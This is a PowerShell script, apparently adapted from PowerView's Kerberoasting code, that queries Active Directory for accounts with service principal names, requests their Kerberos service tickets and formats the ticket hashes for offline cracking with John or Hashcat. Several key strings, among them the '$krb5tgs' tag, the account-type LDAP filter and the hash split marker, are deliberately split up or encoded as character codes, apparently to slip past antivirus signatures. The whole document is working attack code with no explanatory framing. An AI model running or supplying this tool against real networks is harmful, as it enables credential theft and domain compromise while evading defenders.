function Get-DomainSearcher {

    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBasePrefix,

        [ValidateNotNullOrEmpty()]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1,10000)] 
        [Int]
        $ResultPageSize = 200,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {

        if ($Domain) {
            $TargetDomain = $Domain
        }
        else {
            $TargetDomain = (Get-NetDomain).name
        }

        if ($Credential -eq [Management.Automation.PSCredential]::Empty) {
            if (-not $Server) {
                try {
                    # if there's no -Server specified, try to pull the primary DC to bind to
                    $BindServer = ((Get-NetDomain).PdcRoleOwner).Name
                }
                catch {
                    throw 'Get-DomainSearcher: Error in retrieving PDC for current domain'
                }
            }
        }
        elseif (-not $Server) {
            try {
                $BindServer = ((Get-NetDomain -Credential $Credential).PdcRoleOwner).Name
            }
            catch {
                throw 'Get-DomainSearcher: Error in retrieving PDC for current domain'
            }
        }

        $SearchString = 'LDAP://'

        if ($BindServer) {
            $SearchString += $BindServer
            if ($TargetDomain) {
                $SearchString += '/'
            }
        }

        if ($SearchBasePrefix) {
            $SearchString += $SearchBasePrefix + ','
        }

        if ($SearchBase) {
            if ($SearchBase -Match '^GC://') {
                # if we're searching the global catalog, get the path in the right format
                $DN = $SearchBase.ToUpper().Trim('/')
                $SearchString = ''
            }
            else {
                if ($SearchBase -match '^LDAP://') {
                    if ($SearchBase -match "LDAP://.+/.+") {
                        $SearchString = ''
                    }
                    else {
                        $DN = $SearchBase.Substring(7)
                    }
                }
                else {
                    $DN = $SearchBase
                }
            }
        }
        else {
            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
                $DN = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        $SearchString += $DN
        Write-Verbose "Get-DomainSearcher search string: $SearchString"

        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "Using alternate credentials for LDAP connection"
            $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
        }
        else {
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
        }

        $Searcher.PageSize = $ResultPageSize
        $Searcher.SearchScope = $SearchScope
        $Searcher.CacheResults = $False

        if ($Tombstone) {
            $Searcher.Tombstone = $True
        }

        if ($LDAPFilter) {
            $Searcher.filter = $LDAPFilter
        }

        if ($SecurityMasks) {
            $Searcher.SecurityMasks = Switch ($SecurityMasks) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if ($Properties) {
            # handle an array of properties to load w/ the possibility of comma-separated strings
            $PropertiesToLoad = $Properties| ForEach-Object { $_.Split(',') } 
            $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
        }

        $Searcher
    }
}

function Convert-LDAPProperty {

    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )

    $ObjectProperties = @{}

    $Properties.PropertyNames | ForEach-Object {
        if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
            # convert the SID to a string
            $ObjectProperties[$_] = (New-Object System.Security.Principal.SecurityIdentifier($Properties[$_][0], 0)).Value
        }
        elseif ($_ -eq 'objectguid') {
            # convert the GUID to a string
            $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
        }
        elseif ($_ -eq 'ntsecuritydescriptor') {
            $ObjectProperties[$_] = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
        }
        elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
            # convert timestamps
            if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                # if we have a System.__ComObject
                $Temp = $Properties[$_][0]
                [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
            }
            else {
                # otherwise just a string
                $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
            }
        }
        elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
            # try to convert misc com objects
            $Prop = $Properties[$_]
            try {
                $Temp = $Prop[$_][0]
                Write-Verbose $_
                [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
            }
            catch {
                $ObjectProperties[$_] = $Prop[$_]
            }
        }
        elseif ($Properties[$_].count -eq 1) {
            $ObjectProperties[$_] = $Properties[$_][0]
        }
        else {
            $ObjectProperties[$_] = $Properties[$_]
        }
    }

    New-Object -TypeName PSObject -Property $ObjectProperties
}

function Get-NetDomain {

    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {

            Write-Verbose "Using alternate credentials for Get-NetDomain"

            if (-not $Domain) {
                # if no domain is supplied, extract the logon domain from the PSCredential passed
                $TargetDomain = $Credential.GetNetworkCredential().Domain
                Write-Verbose "Extracted domain '$Domain' from -Credential"
            }
            else {
                $TargetDomain = $Domain
            }

            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose "The specified domain does '$TargetDomain' not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid."
                $Null
            }
        }
        elseif ($Domain) {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose "The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust."
                $Null
            }
        }
        else {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
    }
}

function Get-SPNTicket {

    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName='RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,

        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,

        [Parameter(Position = 1)]
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'John'
    )

    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
    }

    PROCESS {
        if ($PSBoundParameters['User']) {
            $TargetObject = $User
        }
        else {
            $TargetObject = $SPN
        }

        ForEach ($Object in $TargetObject) {
            if ($PSBoundParameters['User']) {
                $UserSPN = $Object.ServicePrincipalName
                $SamAccountName = $Object.SamAccountName
                $DistinguishedName = $Object.DistinguishedName
            }
            else {
                $UserSPN = $Object
                $SamAccountName = $Null
                $DistinguishedName = $Null
            }

            $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
            $TicketByteStream = $Ticket.GetRequest()
            
            if ($TicketByteStream) {
                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'

                $obfuscatedStringPart1 = [char]65 + [char]52 + [char]56
                $obfuscatedStringPart2 = [char]50 + [char]48 + [char]49
                $splitJoinString = $obfuscatedStringPart1 + $obfuscatedStringPart2

                [System.Collections.ArrayList]$Parts = ($TicketHexStream -replace '^(.*?)04820...(.*)','$2') -Split $splitJoinString

                $Parts.RemoveAt($Parts.Count - 1)
                $Hash = $Parts -join $splitJoinString
                $Hash = $Hash.Insert(32, '$')

                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName

                if ($OutputFormat -eq 'John') {
                    $tag = ('$' + 'kr' + 'b5' + 'tgs')
                    $etype = 23
                    $HashFormat = $tag + '$' + $etype + '$' + $Ticket.ServicePrincipalName + ':' + $Hash

                }
                else {
                    if ($DistinguishedName -ne $null -and $DistinguishedName -ne '') {
                        $UserDomain = ( ($DistinguishedName -split ',') | Where-Object { $_ -like 'DC=*' } | ForEach-Object { $_.Substring(3) } ) -join '.'
                    }
                    else {
                        $UserDomain = 'UNKNOWN'
                    }
                    
                    $t0 = ('$' + 'kr' + 'b5' + 'tgs')
                    $t1 = '23'
                    $t2 = '*'
                    $t3 = $SamAccountName
                    $t4 = $UserDomain
                    $t5 = $Ticket.ServicePrincipalName
                    $t6 = $Hash

                    $HashFormat = $t0 + '$' + $t1 + '$' + $t2 + $t3 + '$' + $t4 + '$' + $t5 + '*' + '$' + $t6

                }


                $Out | Add-Member Noteproperty 'Hash' $HashFormat

                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')

                Write-Output $Out
                break
            }
        }
    }
}

function Invoke-Kerby {

    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Switch]
        $AdminCount,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1,10000)] 
        [Int]
        $ResultPageSize = 200,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'John'
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $UserSearcher = Get-DomainSearcher @SearcherArguments

        $GetSPNTicketArguments = @{}
        if ($PSBoundParameters['OutputFormat']) { $GetSPNTicketArguments['OutputFormat'] = $OutputFormat }

    }

    PROCESS {
        if ($UserSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_
                if ($IdentityInstance -match '^S-1-.*') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^CN=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                }
                else {
                    try {
                        $Null = [System.Guid]::Parse($IdentityInstance)
                        $IdentityFilter += "(objectguid=$IdentityInstance)"
                    }
                    catch {
                        $IdentityFilter += "(samAccountName=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }
            $Filter += '(servicePrincipalName=*)'

            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose 'Searching for adminCount=1'
                $Filter += '(admincount=1)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            $a1 = '(' + 's' + 'a' + 'm' + 'A' + 'c' + 'c' + 'o' + 'u' + 'n' + 't' + 'T' + 'y' + 'p' + 'e' + '=' + '8' + '0' + '5' + '3' + '0' + '6' + '3' + '6' + '8' + ')'
            $a2 = '(' + '&' + $a1 + $Filter + ')'
            $UserSearcher.Filter = $a2

            $searchterm = "Power"+"View"+"."+"User"
            $Results = $UserSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $User = Convert-LDAPProperty -Properties $_.Properties
                $User.PSObject.TypeNames.Insert(0, $searchterm)
                $User
            } | Where-Object {$_.SamAccountName -notmatch 'krbtgt'} | Get-SPNTicket @GetSPNTicketArguments

            $Results.dispose()
            $UserSearcher.dispose()
        }
    }
}
